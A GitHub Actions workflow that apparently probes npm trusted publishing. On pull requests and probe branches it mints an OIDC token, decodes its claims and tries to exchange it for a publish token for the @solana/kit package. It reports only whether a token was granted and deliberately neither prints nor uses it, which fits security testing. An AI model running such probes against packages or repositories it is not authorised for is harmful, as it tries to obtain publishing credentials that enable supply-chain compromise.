name: npm exchange probe (no publish)
on:
  workflow_dispatch:
  pull_request:
  push:
    branches:
      - 'probe/**'
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Mint OIDC token and attempt package exchange (no publish)
        env:
          ID_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
        run: |
          set -u
          echo "event=${GITHUB_EVENT_NAME} ref=${GITHUB_REF} ref_type=${GITHUB_REF_TYPE:-?}"
          TOKEN=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ID_URL}&audience=npm:registry.npmjs.org" | jq -r .value)
          if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then echo "NO_TOKEN"; exit 0; fi
          echo "oidc_token_len=${#TOKEN}"
          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '{event_name,ref,ref_type,environment,repository,workflow_ref,sub,aud}' || true
          CODE=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/@solana%2fkit")
          echo "exchange_http=$CODE"
          python3 - <<'PY'
import json
try:
    d=json.load(open('/tmp/resp.json'))
except Exception as e:
    print("resp_parse_err",e); raise SystemExit
if isinstance(d,dict) and d.get('token'):
    print("EXCHANGE_ACCEPTED token_present=True token_len=%d (NOT printed, NOT used)" % len(d['token']))
else:
    print("body=",json.dumps(d)[:600])
PY
